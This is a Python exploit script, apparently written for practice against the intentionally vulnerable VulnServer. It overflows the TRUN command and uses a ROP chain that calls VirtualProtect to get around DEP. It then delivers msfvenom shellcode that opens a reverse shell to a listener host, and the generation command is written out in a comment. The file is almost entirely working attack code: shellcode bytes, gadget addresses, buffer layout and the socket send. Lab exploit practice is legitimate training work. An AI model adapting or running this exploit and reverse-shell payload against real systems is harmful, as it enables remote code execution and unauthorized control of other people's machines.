#!/etc/python
#Written By: Jb05s
#Purpose: VulnServer - DEP Bypass

import socket, sys, os, struct

host = "10.0.0.26"
port = 9999

"""
msfvenom -p windows/shell_reverse_tcp LHOST=10.0.0.21 LPORT=4231 -f c -b \x00
Payload size: 351 bytes
"""

sc = ("\xd9\xe5\xd9\x74\x24\xf4\x5b\xbe\x7d\x15\x1c\xb7\x2b\xc9\xb1"
"\x52\x83\xeb\xfc\x31\x73\x13\x03\x0e\x06\xfe\x42\x0c\xc0\x7c"
"\xac\xec\x11\xe1\x24\x09\x20\x21\x52\x5a\x13\x91\x10\x0e\x98"
"\x5a\x74\xba\x2b\x2e\x51\xcd\x9c\x85\x87\xe0\x1d\xb5\xf4\x63"
"\x9e\xc4\x28\x43\x9f\x06\x3d\x82\xd8\x7b\xcc\xd6\xb1\xf0\x63"
"\xc6\xb6\x4d\xb8\x6d\x84\x40\xb8\x92\x5d\x62\xe9\x05\xd5\x3d"
"\x29\xa4\x3a\x36\x60\xbe\x5f\x73\x3a\x35\xab\x0f\xbd\x9f\xe5"
"\xf0\x12\xde\xc9\x02\x6a\x27\xed\xfc\x19\x51\x0d\x80\x19\xa6"
"\x6f\x5e\xaf\x3c\xd7\x15\x17\x98\xe9\xfa\xce\x6b\xe5\xb7\x85"
"\x33\xea\x46\x49\x48\x16\xc2\x6c\x9e\x9e\x90\x4a\x3a\xfa\x43"
"\xf2\x1b\xa6\x22\x0b\x7b\x09\x9a\xa9\xf0\xa4\xcf\xc3\x5b\xa1"
"\x3c\xee\x63\x31\x2b\x79\x10\x03\xf4\xd1\xbe\x2f\x7d\xfc\x39"
"\x4f\x54\xb8\xd5\xae\x57\xb9\xfc\x74\x03\xe9\x96\x5d\x2c\x62"
"\x66\x61\xf9\x25\x36\xcd\x52\x86\xe6\xad\x02\x6e\xec\x21\x7c"
"\x8e\x0f\xe8\x15\x25\xea\x7b\x9a\xb0\xf5\x10\xf2\xc6\xf5\xf6"
"\x85\x4e\x13\x9c\x99\x06\x8c\x09\x03\x03\x46\xab\xcc\x99\x23"
"\xeb\x47\x2e\xd4\xa2\xaf\x5b\xc6\x53\x40\x16\xb4\xf2\x5f\x8c"
"\xd0\x99\xf2\x4b\x20\xd7\xee\xc3\x77\xb0\xc1\x1d\x1d\x2c\x7b"
"\xb4\x03\xad\x1d\xff\x87\x6a\xde\xfe\x06\xfe\x5a\x25\x18\xc6"
"\x63\x61\x4c\x96\x35\x3f\x3a\x50\xec\xf1\x94\x0a\x43\x58\x70"
"\xca\xaf\x5b\x06\xd3\xe5\x2d\xe6\x62\x50\x68\x19\x4a\x34\x7c"
"\x62\xb6\xa4\x83\xb9\x72\xd4\xc9\xe3\xd3\x7d\x94\x76\x66\xe0"
"\x27\xad\xa5\x1d\xa4\x47\x56\xda\xb4\x22\x53\xa6\x72\xdf\x29"
"\xb7\x16\xdf\x9e\xb8\x32")

"""
!mona rop -m *.dll -cp nonull
"""

def create_rop_chain():
    rop_gadgets = [
        0x662e93e9,  # POP ECX # RETN [hnetcfg.dll]
        0x6250609c,  # ptr to &VirtualProtect() [IAT essfunc.dll]
        0x7e45373d,  # MOV EAX,DWORD PTR DS:[ECX] # RETN [USER32.dll]
        0x77f53564,  # XCHG EAX,ESI # RETN [GDI32.dll]
        0x77c35d78,  # POP EBP # RETN [msvcrt.dll]
        0x625011bb,  # & jmp esp [essfunc.dll]
        0x77eed7ae,  # POP EAX # RETN [RPCRT4.dll]
        0xfffffdff,  # Value to negate, will become 0x00000201
        0x77e8d222,  # NEG EAX # RETN [RPCRT4.dll]
        0x77f301e4,  # XCHG EAX,EBX # RETN [GDI32.dll]
        0x77eed7a5,  # POP EAX # RETN [RPCRT4.dll]
        0xffffffc0,  # Value to negate, will become 0x00000040
        0x77eda3d7,  # NEG EAX # RETN [RPCRT4.dll]
        0x77c58fbc,  # XCHG EAX,EDX # RETN [msvcrt.dll]
        0x77c41a63,  # POP ECX # RETN [msvcrt.dll]
        0x77e49839,  # &Writable location [ADVAPI32.dll]
        0x77c3dbbc,  # POP EDI # RETN [msvcrt.dll]
        0x77e8d224,  # RETN (ROP NOP) [RPCRT4.dll]
        0x7c83c304,  # POP EAX # RETN [kernel32.dll]
        0x90909090,  # nop
        0x7e423ad9,  # PUSHAD # RETN [USER32.dll]
    ]
    return ''.join(struct.pack('<I', _) for _ in rop_gadgets)

rop_chain = create_rop_chain()
pre = "\x41" * 2003
nop = "\x90" * 16
pad = "\x43" * (5000 - len(pre) + len(rop_chain) + len(nop) + len(sc))

buffer = pre + rop_chain + nop + sc + pad

payload = "TRUN /.:/" + buffer

exploit = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
exploit.connect((host,port))
exploit.send(payload)
exploit.close()
